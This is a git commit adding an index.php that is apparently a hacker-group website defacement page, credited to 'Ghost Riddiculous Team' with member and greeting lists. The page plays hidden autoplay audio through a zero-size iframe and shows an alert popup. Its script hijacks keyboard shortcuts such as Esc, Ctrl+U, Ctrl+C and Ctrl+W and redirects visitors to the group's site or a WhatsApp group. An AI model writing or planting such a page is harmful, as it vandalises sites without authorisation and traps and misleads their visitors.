118d72ff50dc0a89af8a0a219a72ea4d35222514
arinurhayadin1987 <49691393+arinurhayadin1987@users.noreply.github.com>
2019-09-05 19:59:50 +0700

    Add files via upload

---
+++ index.php
@@ -0,0 +1,132 @@
+
+<head>
+<title>Touched By 4R1N0TS4F3</title>
+
+<script language="JavaScript">alert(" Ghost Riddiculous Team ");</script>
+
+<style type="text/css">body, a:hover {cursor: url(http://cur.cursors-4u.net/cursors/cur-11/cur1058.ani), url(http://cur.cursors-4u.net/cursors/cur-11/cur1058.png), progress;}</style><a href="http://www.cursors-4u.com/cursor/2012/03/03/blue-fire-pointer.html" target="_blank" title="Blue Fire Pointer"><img src="http://cur.cursors-4u.net/cursor.png" border="0" alt="Blue Fire Pointer" style="position:absolute; top: 0px; right: 0px;" /></a>
+
+<link rel="icon" href="https://image.flaticon.com/icons/svg/272/272552.svg">
+<meta content='Touched By 4R1N0TS4F3'/>
+<meta content='Touched By 4R1N0TS4F3'/>
+<meta content='Touched By 4R1N0TS4F3'/>
+<meta name="title" content="Touched By 4R1N0TS4F3">
+<meta name="description" content="">
+<meta name="keywords" content="Touched By 4R1N0TS4F3">
+<meta name="googlebot" content="index,follow" />
+<meta name="robots" content="all" />
+<meta name="robots schedule" content="auto" />
+<meta name="distribution" content="global" />
+<meta contact='Touched By 4R1N0TS4F3'/>
+<div id='och' align="center">
+
+<font size='30'><link href="https://fonts.googleapis.com/css?family=Creepster" rel="stylesheet"> 
+<link href="https://fonts.googleapis.com/css?family=Chewy" rel="stylesheet"> <font face="Creepster"  color="aqua">
+Ghost Riddiculous Team Ft CloudNine
+
+
+</font>
+</head>
+
+<br>
+<br>
+
+<body>
+
+<iframe width="0" height="0" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/604635321&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true&visual=true"></iframe>
+
+<style>
+*{
+	margin-top:2px;
+}
+
+body{
+    background-position: center;
+	background-color:#000000;
+    height:98%;
+    width:99%;
+    background-attachment: fixed;
+    background-size:100% 117%;
+	background-image: url(http://7wallpapers.net/wp-content/uploads/7_Dota2-Drow-Ranger.jpg);
+	cursor: url(http://cur.cursors-4u.net/cursors/cur-
+
+11/cur1025.ani), url(http://cur.cursors-4u.net/cursors/cur-
+
+11/cur1025.png), progress !important;
+}
+.foter span{
+	text-align: center;
+    font-family: Orbitron;
+    font-size: 300%;
+    color: silver;
+    text-shadow: 0 0 3px silver, 0px 0px 5px darkblue;
+}
+
+#sec:hover{
+	color:#000000;
+	text-shadow: 0 0 3px silver, 0px 0px 5px darkblue;
+}
+
+</style>
+
+
+<pre style='text-align: center; color: yellow; font-weight: bold; font-size: 15px;'>
+*-~'`^'*u_                                _u*'^`'~-*,
+p!^       /  jPw                            w9j \        ^!p
+w^.._      /      '\_                      _/'     \        _.^w
+*_   /          \_       _    _      _/         \     _*
+ q /           / \q   ( '---' )   p/ \          \   p
+jj5****._    /    ^\_) o  o (_/^    \    _.****6jj
+*_ /      '==) ;; (=='      \ _*
+`/.w***,   /(    )\   ,***w.\'
+^      ^c/ )    ( \c^      ^
+'V')_)(_('V'</pre>
+
+<br>
+	
+<font size='20'><link href="https://fonts.googleapis.com/css?family=Creepster" rel="stylesheet"> 
+<link href="https://fonts.googleapis.com/css?family=Chewy" rel="stylesheet"> <font face="Creepster"  color="aqua"> You don't have to be great at something to start, but you have to start to be great at something.
+ </font>
+      <br>
+      <br>
+     <font size='5'><link href="https://fonts.googleapis.com/css?family=Creepster" rel="stylesheet"> 
+<link href="https://fonts.googleapis.com/css?family=Chewy" rel="stylesheet"> <font face="Creepster"  color="aqua"> My Team : -=[DeathLocked | V!. | Mr.Yagami | MR.K4L1L1NUX#00 | 4R1N0TS4F3 | ./Zet404 | 4Pr1l28 | Mr.iwong404 | AllForOne | ./Rzlchrn | Umam1337 | Santuy1337 | Odiq]=- </font>
+ 
+<br>
+
+
+
+
+<table align=center border="0">
+<tr>
+<td width=100% id=greetz>
+<marquee behavior="scroll" direction="left" scrollamount="4" scrolldelay="55" width="100%">
+<font size="5px" style="font-family: Iceland, sans-serif;color:white;text-shadow: 0 0 3px red, 0px 0px 5px red" >
+<b>-=|My Friends : +_+ XerXez777 
+- 4R1N0TS4F3 
+- Zamalud1n 
+- L0K1 
+- InXed
+ - Yuzun 
+- JustSmile
+ - Xone7 - D3NCY4N - T3R4B1T3S - Mr.Medan - B-Flow72 - Ghz7 - all member FR13ND INJECTION Family - All Member Banyumas Cyber Team - All member Indonesian Error System - Bee Cyber Security - Sunda Cyber Army - AND YOU  +_+|=-</font>
+      <br>
+      <br>
+     
+<br>
+
+<script type="text/javascript"> //<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},
+shortcut.add("esc",function(){top.location.href="https://chat.whatsapp.com/Hg8XppZTvIU7l1BmpB6pQf"});
+shortcut.add("Ctrl+Shift+Del",function(){top.location.href="https://chat.whatsapp.com/Hg8XppZTvIU7l1BmpB6pQf"});
+shortcut.add("Ctrl+F",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+W",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+U",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+A",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+S",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+X",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+C",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+V",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+Y",function(){top.location.href="http://www.ghost-riddiculous.org"});
+shortcut.add("Ctrl+Z",function(){top.location.href="http://www.ghost-riddiculous.org"});
+//]]></script>
